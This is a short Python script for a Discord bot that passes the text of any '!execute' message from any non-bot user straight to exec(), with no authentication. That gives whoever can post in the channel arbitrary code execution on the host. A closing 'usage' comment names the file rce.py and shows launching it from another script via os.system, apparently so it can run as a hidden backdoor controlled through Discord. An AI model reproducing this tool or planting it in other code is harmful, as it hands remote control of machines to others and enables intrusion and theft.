import discord

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('Bot connected to Discord!')

@client.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.startswith('!execute'):
        code = message.content[len('!execute'):].strip()
        try:
            exec(code)
        except Exception as e:
            await message.channel.send(f'An error occurred: {e}')
        else:
            await message.channel.send('Code executed successfully.')

# Replace 'YOUR_TOKEN' with your Discord bot token
client.run('YOUR_TOKEN')

#usage 
#import os
#os.system("python3 rce.py")
#replace "your_token" with your bot token!
